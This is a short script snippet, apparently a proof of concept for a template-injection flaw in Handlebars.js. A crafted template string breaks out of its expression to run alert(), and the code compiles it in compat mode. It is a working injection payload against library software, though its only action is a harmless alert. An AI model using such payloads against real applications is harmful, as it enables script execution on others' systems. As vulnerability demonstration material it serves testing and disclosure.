<script> 
// compile the template 

var s2 = 
{{&#39;a/.&quot;) || alert(&quot;Vulnerable Handlebars JS when compiling in compat mode&#39;}}
; 
var template = Handlebars.compile(s2, { 
compat: true 
}); 
// execute the compiled template and print the output to the console console.log(template({})); 
</script>
